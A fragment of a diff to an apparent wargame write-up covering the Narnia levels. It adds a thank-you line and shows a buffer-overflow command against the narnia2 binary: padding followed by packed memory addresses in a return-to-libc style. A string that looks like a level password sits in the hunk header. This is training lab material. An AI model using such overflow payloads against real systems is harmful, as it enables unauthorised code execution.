@@ -132,7 +132,7 @@ nairiepecu
 I hope this helped to explain some basic computer exploitation principles in regards to environment variables. As for shellcode, I'll do some reading up on that and provide some better explanations in the future.
 
 ### Narnia2
-**TBD**
+First off, I would like to thank [http://github.com/cphamlet Connor Hamlet]
 
 ```
 narnia2@narnia:~$ /narnia/narnia2 $(python -c 'print "A"*132+"\x50\xc8\xe4\xf7\x10\x10\xe1\xf7\xc8\xec\xf6\xf7"')
